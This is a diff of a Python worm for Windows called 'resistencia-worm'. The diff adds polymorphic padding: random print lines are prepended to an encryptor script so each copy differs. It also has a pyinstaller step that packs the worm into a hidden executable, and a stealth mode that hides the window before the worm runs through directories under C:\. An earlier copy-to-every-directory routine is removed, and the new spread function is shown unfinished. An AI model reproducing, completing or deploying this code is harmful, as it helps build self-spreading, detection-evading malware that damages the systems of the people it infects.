@@ -5,9 +5,12 @@ import threading
 import shutil
 import win32con
 import win32gui
+import random
 from os import system
 
+
 ROOTDIR = r"C:\\"
+ENCRYPTOR_PATH = os.path.join(sys.path[0], "encryptor.py")
 
 class Worm:
     def __init__(self):
@@ -29,18 +32,27 @@ class Worm:
 
         self.directories_found = True
 
+# C:/Program Files/Windows NT/Accessories -> target_dir_list[30]
     def spread(self):
-        for directory in self.target_dir_list:
-            destination = os.path.join(directory, ".worm.py")
-            shutil.copyfile(self.own_path, destination)
+        this = open(ENCRYPTOR_PATH, "r")
+        worm_poli = ""
+        times = random.randrange(1, 7)
+        for i in range(times):
+            num = random.randrange(-sys.maxsize, sys.maxsize)
+            worm_poli += "print(" + str(num) + ")\n"
+
+        worm_poli += "\n"
+
+        for line in this:
+            worm_poli += line
+
 
     def execute_worm(self):
-        # self.create_new_worm()
-        # self.copy_existing_files()
         if not self.directories_found:
             self.find_directories()
 
-        print(self.target_dir_list)
+        # print(self.target_dir_list)
+        self.spread()
 
 def banner_func():
     print("""
@@ -72,7 +84,7 @@ if __name__ == "__main__":
     while opt != 0:
         worm_menu()
         opt = int(input("Operation: "))
-        time.sleep(3)
+        time.sleep(1)
         match opt:
             case 1:
                 print("[!] Running Worm!")
@@ -86,11 +98,9 @@ if __name__ == "__main__":
                 os.system("pyinstaller resistencia-worm.py --onefile --noconsole")
                 print("[!] resistencia-worm.exe Created")
             case 3:
-                print("[!] Running Worm in Stealth Mode!")
-                print('[!] Press [Ctrl] + [C] to Stop!')
-                time.sleep(2)
                 hide = win32gui.GetForegroundWindow()
                 win32gui.ShowWindow(hide, win32con.SW_HIDE)
+                time.sleep(2)
 
                 worm.execute_worm()
             case 0:
